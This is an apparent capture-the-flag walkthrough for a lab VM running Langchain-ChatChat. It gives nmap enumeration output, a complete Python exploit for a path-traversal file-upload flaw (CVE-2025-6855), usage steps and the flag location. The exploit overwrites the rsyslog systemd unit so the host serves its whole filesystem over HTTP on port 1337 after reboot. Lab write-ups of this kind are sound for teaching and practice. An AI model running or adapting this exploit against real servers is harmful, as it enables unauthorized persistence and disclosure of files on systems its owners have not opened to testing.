## ChainWalk Walkthrough

### Setup

From your **attacker machine**, navigate to the `walkthrough` directory and ensure you have the **target VM's IP address**.
### Enumeration
By default chatchat runs on port 8501, with the API service running on 7861.
```
▶ nmap -Pn MACHINE_IP -sV -p 8501,7861,1337,22 -vv
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-03 14:19 IST
NSE: Loaded 45 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 14:19
Completed Parallel DNS resolution of 1 host. at 14:19, 0.07s elapsed
Initiating Connect Scan at 14:19
Scanning MACHINE_IP [4 ports]
Discovered open port 8501/tcp on MACHINE_IP
Discovered open port 1337/tcp on MACHINE_IP
Discovered open port 7861/tcp on MACHINE_IP
Completed Connect Scan at 14:19, 1.20s elapsed (4 total ports)
Initiating Service scan at 14:19
Scanning 3 services on MACHINE_IP
Completed Service scan at 14:20, 58.80s elapsed (3 services on 1 host)
NSE: Script scanning MACHINE_IP
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 14:20
Completed NSE at 14:20, 0.02s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 14:20
Completed NSE at 14:20, 1.05s elapsed
Nmap scan report for MACHINE_IP
Host is up, received user-set (0.00035s latency).
Scanned at 2025-07-03 14:19:33 IST for 61s

PORT     STATE    SERVICE REASON      VERSION
22/tcp   filtered ssh     no-response
1337/tcp open     http    syn-ack     SimpleHTTPServer 0.6 (Python 3.10.12)
7861/tcp open     unknown syn-ack
8501/tcp open     http    syn-ack     Tornado httpd 6.5.1
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7861-TCP:V=7.80%I=7%D=7/3%Time=68664424%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HT
SF:TP\x20request\x20received\.")%r(GetRequest,90,"HTTP/1\.1\x20307\x20Temp
SF:orary\x20Redirect\r\ndate:\x20Thu,\x2003\x20Jul\x202025\x2008:49:40\x20
SF:GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x200\r\nlocation:\x20/docs
SF:\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,CB,"HTTP/1\.1\x20405\x
SF:20Method\x20Not\x20Allowed\r\ndate:\x20Thu,\x2003\x20Jul\x202025\x2008:
SF:49:40\x20GMT\r\nserver:\x20uvicorn\r\nallow:\x20GET\r\ncontent-length:\
SF:x2031\r\ncontent-type:\x20application/json\r\nConnection:\x20close\r\n\
SF:r\n{\"detail\":\"Method\x20Not\x20Allowed\"}")%r(RTSPRequest,76,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20rec
SF:eived\.")%r(DNSVersionBindReqTCP,76,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(DNSStatusRequest
SF:TCP,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20
SF:request\x20received\.")%r(SSLSessionReq,76,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20re
ceived\.")%r(TerminalS
SF:erverCookie,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20
SF:HTTP\x20request\x20received\.")%r(TLSSessionReq,76,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(K
SF:erberos,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP
SF:\x20request\x20received\.")%r(SMBProgNeg,76,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.");

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.49 seconds
```
Screenshot for 8501 web UI
![image](https://github.com/user-attachments/assets/3a4622f7-3265-48f4-9344-c4fb3be01d57)

Screenshot for API docs
![image](https://github.com/user-attachments/assets/f780373b-fb0e-4c94-a22c-e32b104333ee)

### Exploit Logic

`exploit.py`:

```python
import requests

url = "http://127.0.0.1:7861/v1/files?purpose=assistants"

service_path = "../../../../../../../../../../etc/systemd/system/rsyslog.service"

service_content = """[Unit]
Description=Evil Python HTTP Server
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 -m http.server 1337
ExecStartPost=/bin/echo "HTTP server running on port 1337"
Restart=always

[Install]
WantedBy=multi-user.target
"""

files = {
    "file": (service_path, service_content, "text/plain")
}
r = requests.post(url, files=files)
print("[+] rsyslog.service hijacked and uploaded:", r.status_code)
```

This exploit targets a **vulnerable file upload endpoint** exposed by Langchain-ChatChat on port `7861`. Specifically:

* The endpoint `/v1/files?purpose=assistants` is vulnerable to **path traversal** (CVE-2025-6855).
* By crafting a filename with `../../../../../`, the script **escapes the upload directory** and writes a file to `/etc/systemd/system/rsyslog.service`.
* Instead of the legitimate system logging service, the overwritten `rsyslog.service` starts a **Python HTTP server** on port `1337` each time the system boots.

Because the VM has no login access, this approach works by **modifying the system startup behavior**. After reboot, the Python server runs automatically — no user login is required.

Once running, this server serves the filesystem from the root directory, giving remote access to files.

### Usage

1. Run the exploit from your attacker machine:

   ```bash
   python3 exploit.py
   ```

2. If successful, you’ll see:

   ```
   [+] rsyslog.service hijacked and uploaded: 200
   ```

3. Now, **reboot the VM** (power it off and turn it back on). No need to log in.


### Step 5: Access the Filesystem

Once the VM restarts, visit the following from your attacker machine:

```
http://<TARGET_VM_IP>:1337
```

You will see a **directory listing of the target machine’s filesystem**, served via Python’s built-in HTTP server.
![image](https://github.com/user-attachments/assets/1bc83065-ba0e-4f28-bbbc-e22f1553beff)

---

### Step 6: Capture the Flag

Browse to the following path in the web interface:

```
home/vboxuser/chainwalk/build/flag_{CHAINWALK}.txt
```

Download or view the file to capture the flag.

---
